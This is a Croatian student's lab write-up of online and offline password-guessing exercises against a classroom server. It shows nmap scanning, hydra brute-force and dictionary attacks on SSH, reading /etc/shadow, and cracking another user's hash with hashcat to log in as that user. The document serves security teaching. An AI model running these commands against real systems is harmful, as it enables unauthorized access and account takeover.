# Laboratorijske vježbe 5- Online & Offline Password Guessing Attacks

**Online Password Guessing**

Najprije smo otvorili bash shell i pingali localni server.

`ping a507-server.local`

Instalirali smo nmap i u bashu upisali odgovarajuće naredbe:

```
sudo apt-get update
sudo apt-get install nmap

nmap
```

Naredbom `nmap -v 10.0.15.0/28` odredili smo doseg IP adresa.

S web adrese [http://a507-server.local/](http://a507-server.local/) sam pronašla svoj docker container i ime, a pomoću tih podataka, preko ssh sam se spojila na isti.

`ssh strinic_ela@10.0.15.8`

Nakon toga više puta unosim lozinku, ali dolazim do zaključka da sustav nema limit rate, odnosno da je idealan za online attack.

Lozinka je sastavljena od 4-6 malih slova engleske abecede (ukupno 26 slova), a to znači da ima cca 2^29 kombinacija.

Pomoću hydre, pokušavamo brute-force-at lozinku:

```

hydra -l strinic_ela -x 4:6:a 10.0.15.8 -V -t 4 ssh
```

Stanje nakon toga je:

64 pokušaja/min. To bi značilo da nam je potrebno cca 8 godina da bismo probili lozinku. Izuzetno neprihvatljivo i neisplativo pa koristimo predefinirani dictionary kojeg dohvaćamo sa servera: 

`wget -r -nH -np --reject "index.html*" http://a507-server.local:8080/dictionary/g5/`

Dictionary proslijeđujemo hydri:

`hydra -l strinic_ela -P dictionary/g5/dictionary_online.txt 10.0.15.8 -V -t 4 ssh`

Dictionary ima preko 870 lozinki. Kada sam pronašla svoju, pristupila sam containeru i s lokalnog se spojila na remote računalo.

**Offline Password Guessing**

Sada kada imam pristup remote računalu, želim pronaći tuđu lozinku.

Najprije sam pronašla folder gdje se nalaze hashirane lozinke.

`sudo /etc/shadow`

Kopirala sam hash vrijednost lozinke korisnika jean_doe i spremila je u file imena hash.txt.

`hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10`

Kako je potrebno dosta vremena za brute-force-anje, koristimo predefinirani dictionary.

`hashcat --force -m 1800 -a 0 hash.txt dictionary/g5/dictionary_offline.txt --status --status-timer 10`

Kada je hashcat dohvatio lozinku, uspješno sam se povezala na računalo  korisnika jean_doe.